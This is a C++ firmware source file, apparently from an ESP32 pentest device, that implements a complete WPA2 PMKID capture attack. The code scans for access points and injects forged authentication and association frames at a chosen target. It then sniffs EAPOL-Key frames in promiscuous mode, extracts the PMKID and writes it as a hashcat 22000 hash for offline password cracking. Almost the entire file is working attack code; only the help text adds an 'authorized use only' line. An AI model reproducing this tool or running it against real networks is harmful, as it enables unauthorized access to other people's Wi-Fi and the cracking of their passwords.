#if defined(EVIL_EXTENSIONS) && !defined(LITE_VERSION)
#include "pmkid.h"

#include "menu/others/audio.h"
#include "menu/wifi/wifi_atks.h"
#include "root/app/utils.h"
#include "root/input/mykeyboard.h"
#include "root/net/wifi_common.h"
#include "root/storage/paths.h"
#include "root/storage/sd_functions.h"
#include "root/ui/display.h"
#include "root/ui/kvx_ui.h"
#include <WiFi.h>
#include <esp_wifi.h>
#include <globals.h>
#include <vector>

namespace {

struct TargetAp {
    String ssid;
    uint8_t bssid[6] = {0};
    uint8_t channel = 1;
};

struct CaptureState {
    uint8_t ap[6] = {0};
    uint8_t sta[6] = {0};
    uint8_t pmkid[16] = {0};
    bool have = false;
    uint32_t attempts = 0;
    uint32_t eapolSeen = 0;
};

static volatile CaptureState gCap;
static TargetAp gTarget;
static portMUX_TYPE gMux = portMUX_INITIALIZER_UNLOCKED;

bool isEapol(const uint8_t *payload, int len) {
    if (len < 32) return false;
    // LLC/SNAP + EtherType 0x888E after 802.11 hdr (24) + optional QoS (2)
    for (int off = 24; off <= 26 && off + 8 <= len; off += 2) {
        if (payload[off] == 0xAA && payload[off + 1] == 0xAA && payload[off + 2] == 0x03 &&
            payload[off + 6] == 0x88 && payload[off + 7] == 0x8E)
            return true;
    }
    return false;
}

int eapolOffset(const uint8_t *payload, int len) {
    for (int off = 24; off <= 26 && off + 8 <= len; off += 2) {
        if (payload[off] == 0xAA && payload[off + 1] == 0xAA && payload[off + 2] == 0x03 &&
            payload[off + 6] == 0x88 && payload[off + 7] == 0x8E)
            return off + 8; // start of EAPOL
    }
    return -1;
}

bool extractPmkidKde(const uint8_t *eapol, int eapolLen, uint8_t out[16]) {
    // EAPOL-Key: ver(1) type(1)=3 keyinfo(2) keylen(2) replay(8) nonce(32) iv(16)
    // mic(16) rsc(8) id(8) keydatalen(2) keydata...
    if (eapolLen < 99) return false;
    if (eapol[1] != 0x03) return false; // EAPOL-Key
    uint16_t keyDataLen = ((uint16_t)eapol[97] << 8) | eapol[98];
    if (keyDataLen == 0 || 99 + keyDataLen > eapolLen) return false;
    const uint8_t *kd = eapol + 99;
    int rem = keyDataLen;
    while (rem >= 8) {
        uint8_t type = kd[0];
        uint8_t len = kd[1];
        if (len + 2 > rem) break;
        if (type == 0xDD && len >= 20 && kd[2] == 0x00 && kd[3] == 0x0F && kd[4] == 0xAC && kd[5] == 0x04) {
            memcpy(out, kd + 6, 16);
            return true;
        }
        // Also accept length 0x16 (22) with same OUI/type
        if (type == 0xDD && len >= 22 && kd[2] == 0x00 && kd[3] == 0x0F && kd[4] == 0xAC && kd[5] == 0x04) {
            memcpy(out, kd + 6, 16);
            return true;
        }
        kd += len + 2;
        rem -= len + 2;
    }
    return false;
}

void IRAM_ATTR rxCb(void *buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_DATA && type != WIFI_PKT_MGMT) return;
    const wifi_promiscuous_pkt_t *pkt = (const wifi_promiscuous_pkt_t *)buf;
    if (!pkt || pkt->rx_ctrl.sig_len < 32) return;
    const uint8_t *f = pkt->payload;
    int len = pkt->rx_ctrl.sig_len;

    if (!isEapol(f, len)) return;

    // addr1 = DA, addr2 = SA, addr3 = BSSID (to-DS / from-DS dependent)
    // For AP→STA EAPOL: from-DS, addr1=STA, addr2=BSSID, addr3=STA (or similar)
    const uint8_t *a1 = f + 4;
    const uint8_t *a2 = f + 10;
    const uint8_t *a3 = f + 16;

    bool involvesAp = false;
    const uint8_t *staMac = nullptr;
    if (memcmp(a2, (const void *)gTarget.bssid, 6) == 0) {
        involvesAp = true;
        staMac = a1;
    } else if (memcmp(a3, (const void *)gTarget.bssid, 6) == 0) {
        involvesAp = true;
        staMac = a1;
    } else if (memcmp(a1, (const void *)gTarget.bssid, 6) == 0) {
        involvesAp = true;
        staMac = a2;
    }
    if (!involvesAp || !staMac) return;

    int off = eapolOffset(f, len);
    if (off < 0 || off >= len) return;
    uint8_t pmkid[16];
    if (!extractPmkidKde(f + off, len - off, pmkid)) return;

    portENTER_CRITICAL_ISR(&gMux);
    gCap.eapolSeen++;
    if (!gCap.have) {
        memcpy((void *)gCap.ap, gTarget.bssid, 6);
        memcpy((void *)gCap.sta, staMac, 6);
        memcpy((void *)gCap.pmkid, pmkid, 16);
        gCap.have = true;
    }
    portEXIT_CRITICAL_ISR(&gMux);
}

String macHex(const uint8_t *m) {
    char b[13];
    snprintf(b, sizeof(b), "%02x%02x%02x%02x%02x%02x", m[0], m[1], m[2], m[3], m[4], m[5]);
    return String(b);
}

String essidHex(const String &ssid) {
    String out;
    out.reserve(ssid.length() * 2);
    for (size_t i = 0; i < ssid.length(); i++) {
        char b[3];
        snprintf(b, sizeof(b), "%02x", (uint8_t)ssid[i]);
        out += b;
    }
    return out;
}

String format22000(const uint8_t *pmkid, const uint8_t *ap, const uint8_t *sta, const String &ssid) {
    String line = "WPA*01*";
    for (int i = 0; i < 16; i++) {
        char b[3];
        snprintf(b, sizeof(b), "%02x", pmkid[i]);
        line += b;
    }
    line += "*";
    line += macHex(ap);
    line += "*";
    line += macHex(sta);
    line += "*";
    line += essidHex(ssid);
    line += "***";
    return line;
}

void getStaMac(uint8_t out[6]) {
    WiFi.macAddress(out);
}

void sendAuth(const uint8_t *ap, const uint8_t *sta) {
    uint8_t frame[30];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0xB0; // Auth
    frame[1] = 0x00;
    memcpy(frame + 4, ap, 6);  // DA
    memcpy(frame + 10, sta, 6); // SA
    memcpy(frame + 16, ap, 6); // BSSID
    // seqctrl at 22-23 = 0
    // body: alg=0, seq=1, status=0
    frame[24] = 0x00;
    frame[25] = 0x00;
    frame[26] = 0x01;
    frame[27] = 0x00;
    frame[28] = 0x00;
    frame[29] = 0x00;
    send_raw_frame(frame, sizeof(frame));
}

void sendAssoc(const uint8_t *ap, const uint8_t *sta, const String &ssid) {
    uint8_t frame[128];
    memset(frame, 0, sizeof(frame));
    frame[0] = 0x00; // Assoc req
    frame[1] = 0x00;
    memcpy(frame + 4, ap, 6);
    memcpy(frame + 10, sta, 6);
    memcpy(frame + 16, ap, 6);
    size_t pos = 24;
    // capability
    frame[pos++] = 0x31;
    frame[pos++] = 0x04;
    // listen interval
    frame[pos++] = 0x0A;
    frame[pos++] = 0x00;
    // SSID IE
    frame[pos++] = 0x00;
    frame[pos++] = (uint8_t)ssid.length();
    for (size_t i = 0; i < ssid.length() && pos < sizeof(frame) - 20; i++) frame[pos++] = (uint8_t)ssid[i];
    // Supported rates
    const uint8_t rates[] = {0x01, 0x08, 0x82, 0x84, 0x8b, 0x96, 0x24, 0x30, 0x48, 0x6c};
    for (uint8_t b : rates) {
        if (pos < sizeof(frame)) frame[pos++] = b;
    }
    // Minimal RSN IE (WPA2-PSK CCMP) — helps some APs emit PMKID
    const uint8_t rsn[] = {
        0x30, 0x14, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x04, 0x01, 0x00, 0x00, 0x0f,
        0xac, 0x04, 0x01, 0x00, 0x00, 0x0f, 0xac, 0x02, 0x00, 0x00};
    for (uint8_t b : rsn) {
        if (pos < sizeof(frame)) frame[pos++] = b;
    }
    send_raw_frame(frame, (int)pos);
}

bool pickAp(TargetAp &out) {
    displayTextLine("Scanning...");
    ensureWifiPlatform();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
    delay(100);
    int n = WiFi.scanNetworks(false, true);
    if (n <= 0) {
        displayError("No APs", true);
        return false;
    }
    options.clear();
    std::vector<TargetAp> list;
    std::vector<String> labels;
    for (int i = 0; i < n && i < 40; i++) {
        TargetAp t;
        t.ssid = WiFi.SSID(i);
        if (t.ssid.isEmpty()) t.ssid = "(hidden)";
        memcpy(t.bssid, WiFi.BSSID(i), 6);
        t.channel = (uint8_t)WiFi.channel(i);
        list.push_back(t);
        labels.push_back(t.ssid.substring(0, 16) + " ch" + String(t.channel));
    }
    for (size_t idx = 0; idx < list.size(); idx++) {
        options.push_back({labels[idx].c_str(), [&list, idx, &out]() { out = list[idx]; }});
    }
    int sel = loopOptions(options, MENU_TYPE_SUBMENU, "PMKID target");
    options.clear();
    WiFi.scanDelete();
    if (sel < 0 || list.empty()) return false;
    return out.channel > 0 && (out.bssid[0] | out.bssid[1] | out.bssid[2] | out.bssid[3] | out.bssid[4] |
                               out.bssid[5]) != 0;
}

bool save22000(const String &line, String &pathOut) {
    FS *fs = nullptr;
    if (!getFsStorage(fs) || !fs) return false;
    kvx::paths::ensureDir(*fs, kvx::paths::WIFI_CAPTURES);
    kvx::paths::ensureDir(*fs, kvx::paths::WIFI_CAPTURES_HANDSHAKES);
    pathOut = String(kvx::paths::WIFI_CAPTURES_HANDSHAKES) + "/pmkid_" + String((uint32_t)millis()) + ".22000";
    File f = fs->open(pathOut, FILE_WRITE);
    if (!f) return false;
    f.println(line);
    f.close();
    return true;
}

void pmkidHelp() {
    showAppHelp(
        {
            "Client-less / low-interaction",
            "PMKID capture for hashcat.",
            "",
            "Flow:",
            "  Scan -> pick AP -> channel",
            "  Auth+Assoc TX (this STA)",
            "  Parse EAPOL-Key PMKID KDE",
            "  Also accepts passive M1",
            "  from a real client.",
            "",
            "Saves hashcat 22000 under",
            "  wifi/captures/handshakes/",
            "  pmkid_<ms>.22000",
            "",
            "vs Karma: RSN probe count,",
            "not hash extraction.",
            "vs Handshakes: ESP-NOW PCAP",
            "aggregator only.",
            "vs Sniffer: full 4-way PCAP.",
            "",
            "Lab / authorized use only.",
            "ESC stops.",
        }
    );
}

void pmkidRun() {
    TargetAp ap;
    memset(&ap, 0, sizeof(ap));
    if (!pickAp(ap)) {
        displayError("No target", true);
        return;
    }
    gTarget = ap;
    portENTER_CRITICAL(&gMux);
    memset((void *)&gCap, 0, sizeof(gCap));
    portEXIT_CRITICAL(&gMux);

    wifiDisconnect();
    ensureWifiPlatform();
    WiFi.mode(WIFI_STA);
    WiFi.disconnect(true, true);
    delay(50);

    uint8_t sta[6];
    getStaMac(sta);

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(rxCb);
    wifi_promiscuous_filter_t filt = {};
    filt.filter_mask = WIFI_PROMIS_FILTER_MASK_MGMT | WIFI_PROMIS_FILTER_MASK_DATA;
    esp_wifi_set_promiscuous_filter(&filt);
    esp_wifi_set_channel(ap.channel, WIFI_SECOND_CHAN_NONE);
    esp_wifi_set_promiscuous(true);

    {
        TftFrame frame;
        tft.fillScreen(kvxConfig.bgColor);
        drawKvxTopBar("PMKID");
    }
    tft.setTextSize(FP);
    tft.setTextColor(kvxConfig.priColor, kvxConfig.bgColor);
    int y = KVX_TOPBAR_H + 4;
    tft.drawString(ap.ssid.substring(0, 28), 8, y);
    y += uiLineH(FP) + 2;
    tft.drawString("ch" + String(ap.channel) + " ESC stop", 8, y);

    EscPress = false;
    String painted;
    String savedPath;
    uint32_t lastTx = 0;
    uint32_t start = millis();
    while (!check(EscPress) && !returnToMenu && !forceHome) {
        bool have = false;
        uint32_t attempts = 0, eapol = 0;
        uint8_t pmkid[16], apMac[6], staMac[6];
        portENTER_CRITICAL(&gMux);
        have = gCap.have;
        attempts = gCap.attempts;
        eapol = gCap.eapolSeen;
        if (have) {
            memcpy(pmkid, (const void *)gCap.pmkid, 16);
            memcpy(apMac, (const void *)gCap.ap, 6);
            memcpy(staMac, (const void *)gCap.sta, 6);
        }
        portEXIT_CRITICAL(&gMux);

        if (have && savedPath.isEmpty()) {
            String line = format22000(pmkid, apMac, staMac, ap.ssid == "(hidden)" ? String("") : ap.ssid);
            if (save22000(line, savedPath)) {
                _tone(3500, 40);
            } else {
                savedPath = "(save fail)";
            }
        }

        if (millis() - lastTx > 800 && savedPath.isEmpty()) {
            lastTx = millis();
            sendAuth(ap.bssid, sta);
            delay(20);
            sendAssoc(ap.bssid, sta, ap.ssid == "(hidden)" ? String("") : ap.ssid);
            portENTER_CRITICAL(&gMux);
            gCap.attempts++;
            portEXIT_CRITICAL(&gMux);
        }

        String hud = "try" + String(attempts) + " eapol" + String(eapol);
        if (savedPath.length()) hud = "OK " + savedPath.substring(savedPath.lastIndexOf('/') + 1);
        if (hud != painted) {
            tft.fillRect(8, KVX_TOPBAR_H + 4 + 2 * (uiLineH(FP) + 2), tftWidth - 16, uiLineH(FP) + 4,
                         kvxConfig.bgColor);
            tft.drawString(hud.substring(0, 28), 8, KVX_TOPBAR_H + 4 + 2 * (uiLineH(FP) + 2));
            painted = hud;
        }

        if (savedPath.length() && savedPath != "(save fail)") {
            delay(800);
            break;
        }
        if (millis() - start > 60000) break;
        delay(40);
    }

    esp_wifi_set_promiscuous(false);
    esp_wifi_set_promiscuous_rx_cb(nullptr);
    wifiDisconnect();

    if (savedPath.length() && savedPath != "(save fail)") displayInfo("Saved PMKID", true);
    else displayInfo("No PMKID", true);
}

} // namespace

void pmkidMenu() {
    options = {
        {"Help",  pmkidHelp},
        {"Start", pmkidRun },
    };
    addOptionToMainMenu();
    loopOptions(options, MENU_TYPE_SUBMENU, "PMKID");
    options.clear();
}

#endif
